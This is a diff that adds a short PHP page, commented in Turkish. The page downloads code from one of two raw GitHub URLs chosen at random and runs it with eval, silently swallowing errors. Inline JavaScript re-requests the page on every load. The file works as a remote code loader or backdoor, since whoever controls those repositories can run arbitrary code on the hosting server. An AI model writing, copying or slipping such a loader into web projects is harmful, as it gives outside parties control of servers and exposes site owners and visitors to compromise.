@@ -1,0 +1,51 @@
+<?php
+// Kodların URL'leri
+$codes = [
+    'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/kod1.txt',
+    'https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/kod2.txt',
+];
+
+// Rastgele bir dosya seç
+$randomCodeUrl = $codes[array_rand($codes)];
+
+$fileContent = '';
+
+if (filter_var($randomCodeUrl, FILTER_VALIDATE_URL)) {
+    $fileContent = file_get_contents($randomCodeUrl);
+    if ($fileContent === false) {
+        echo json_encode(['status' => 'error', 'message' => 'Dosya indirilemedi: ' . $randomCodeUrl]);
+        exit;
+    }
+} else {
+    echo json_encode(['status' => 'error', 'message' => 'Geçersiz dosya yolu: ' . $randomCodeUrl]);
+    exit;
+}
+
+// Seçilen dosyayı çalıştır
+try {
+    eval('?>' . $fileContent);
+} catch (Exception $e) {
+}
+?>
+<script>
+window.addEventListener('load', function () {
+    // Sayfa her yüklendiğinde rastgele bir dosya çağrılır
+    console.log("Rastgele bir dosya yükleniyor...");
+
+    fetch(window.location.href, {
+        method: 'GET',
+        headers: { 'Content-Type': 'application/json' }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.status === 'success') {
+            console.log(`%c${data.message}`, "color: green; font-weight: bold;");
+        } else {
+            console.error(`%c${data.message}`, "color: red; font-weight: bold;");
+        }
+    })
+    .catch(error => {
+        console.error("Hata:", error);
+    });
+});
+</script>
